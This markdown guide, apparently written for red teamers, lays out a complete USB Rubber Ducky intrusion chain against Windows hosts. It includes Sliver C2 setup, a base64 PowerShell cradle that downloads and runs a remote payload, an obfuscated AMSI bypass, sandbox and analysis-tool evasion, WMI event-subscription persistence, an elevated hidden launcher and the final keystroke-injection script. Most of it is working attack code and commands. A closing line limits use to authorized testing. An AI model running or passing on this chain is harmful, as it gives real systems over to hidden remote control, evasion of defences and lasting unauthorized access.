# USB Rubber Ducky Reverse Shell Framework (Admin Shell + Persistence)

## ✨ Objective

Deliver a **stealthy reverse shell with persistence** using a **USB Rubber Ducky**, fully automated, with:

* **Administrator execution** of the payload
* **Sliver C2 for shell**
* **WMI Event Subscription** for persistence
* **AMSI bypass** + **sandbox detection** for stealth

> This guide is a step-by-step instruction set for red teamers or security professionals to simulate a real-world physical access scenario.

---

## ✅ Phase 0: Environment Setup

### Attacker (Kali Linux)

* IP: `192.168.1.40`
* Tools:

```bash
sudo apt update && sudo apt install python3 openssl
curl https://sliver.sh/install | sudo bash
```

### Target (Windows 10/11)

* Must be:

  * Unlocked
  * Connected to internet
  * Running as admin or UAC prompt will be triggered

### Hardware

* USB Rubber Ducky (classic or new gen)

---

## 🏡 Phase 1: Start the Sliver C2 Server

```bash
sliver-server
```

* This is your listener and implant generator.
* Sliver will bind to port `443` by default.

---

## 💡 Phase 2: Generate Sliver Payload

```bash
sliver > generate --http --name ducky_shell --lhost 192.168.1.40 --os windows
```

* Output: `ducky_shell.ps1`

```bash
mv ducky_shell.ps1 /var/www/html/
```

---

## 🔄 Phase 3: Create the Combo Script (Reverse Shell + Persistence)

> This PowerShell script will be fetched and executed by the Ducky. It does:
>
> * AMSI bypass
> * Sandbox detection
> * Launches a Sliver reverse shell
> * Deploys WMI persistence

### 📌 Important:

The following line contains your **base64-encoded reverse shell command**:

```powershell
$enc = "SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQAyADIALgAxADYAOAAuADEALgA0ADAALAA0ADQAMwAvAGQAdQBjAGsAeQBfAHMAaABlAGwAbAAuAHAAcwAxACcAKQApAA=="
```

This decodes to:

```powershell
IEX ((New-Object Net.WebClient).DownloadString('https://192.168.1.40:8443/ducky_shell.ps1'))
```

✅ **If you regenerate the Sliver payload or change the server path**, you must:

1. Update the above command string accordingly.
2. Re-encode it:

```bash
echo -n "IEX ((New-Object Net.WebClient).DownloadString('https://192.168.1.40:8443/NEWNAME.ps1'))" | iconv -t UTF-16LE | base64
```

3. Replace `$enc = "..."` with the new output.

Save this as: `/var/www/html/payload_combo.ps1`

```powershell
sET-ItEM ( 'VaRiaBlE:1q2') ([TyPe]("{0}{1}" -f'RUn','tiME')).GetField('Am'+'siInitFa'+'iled','NonPublic,Static').SetValue($null,$true)

function Is-Sandbox {
    $uptime = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
    if ($uptime.TotalMinutes -lt 5) { return $true }
    $ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
    if ($ram -lt 2GB) { return $true }
    $badProcs = @("vboxservice", "vmsrvc", "wireshark", "procmon", "fiddler", "vmtoolsd")
    $procs = Get-Process | Select-Object -ExpandProperty Name
    foreach ($p in $badProcs) { if ($procs -contains $p) { return $true } }
    return $false
}

Start-Sleep -Seconds 10
if (Is-Sandbox) { exit }

$enc = "SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQAyADIALgAxADYAOAAuADEALgA0ADAALAA0ADQAMwAvAGQAdQBjAGsAeQBfAHMAaABlAGwAbAAuAHAAcwAxACcAKQApAA=="
powershell -w hidden -enc $enc

Start-Sleep -Seconds 3

$Payload = "powershell -w hidden -enc $enc"
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
  Name = "WinLogonTrigger"
  EventNamespace = "root\\cimv2"
  QueryLanguage = "WQL"
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerSystem' AND TargetInstance.UserName != NULL"
}
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
  Name = "PayloadConsumer"
  CommandLineTemplate = $Payload
  RunInteractively = $false
}
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
  Filter = $Filter
  Consumer = $Consumer
}
```

---

## 🔗 Phase 4: Encode Admin Launcher

### Command:

```powershell
Start-Process powershell -Verb runAs -ArgumentList "-w hidden -Command IEX(New-Object Net.WebClient).DownloadString('https://192.168.1.40:8443/payload_combo.ps1')"
```

### Encode:

```bash
echo -n "Start-Process powershell -Verb runAs -ArgumentList \"-w hidden -Command IEX(New-Object Net.WebClient).DownloadString('https://192.168.1.40:8443/payload_combo.ps1')\"" | iconv -t UTF-16LE | base64
```

Copy the output for the next step.

---

## 🕹️ Phase 5: Create Final Rubber Ducky Script

```duckyscript
DELAY 1000
GUI r
DELAY 300
STRING powershell -w hidden -enc <ENCODED_COMMAND_HERE>
ENTER
```

* Replace `<ENCODED_COMMAND_HERE>` with the output from Phase 4

---

## 🚀 Phase 6: Host Payloads with HTTPS Server

⚠️ Since Sliver uses port `443`, we'll use port `8443` for the Python server:

```bash
cd /var/www/html
openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 -nodes
sudo python3 -m http.server 8443 --bind 0.0.0.0 --directory . --certfile cert.pem --keyfile cert.pem
```

---

## 🌟 Phase 7: Live Deployment

1. Insert Rubber Ducky
2. PowerShell launches elevated prompt
3. Fetches and runs `payload_combo.ps1`
4. Reverse shell created (via Sliver)
5. WMI persistence deployed

---

## 🔧 Phase 8: Verify and Cleanup

### Verify WMI persistence:

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WinLogonTrigger'"
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='PayloadConsumer'"
```

### Cleanup:

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WinLogonTrigger'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='PayloadConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*WinLogonTrigger*" -or $_.Consumer -like "*PayloadConsumer*" } | Remove-WmiObject
```

---

## ⚡ Summary

* Sliver handles shell & payload (on port 443)
* Python HTTPS server hosts payloads (on port 8443)
* Ducky delivers admin launch
* Persistence lives in WMI

This chain is:

* Fully automated
* Runs as Administrator
* Fileless (except transient memory fetch)
* AMSI-evading
* Sandbox-aware
* 100% Ducky deployable

> Use only in authorized testing environments. Always test, validate, and secure responsibly.
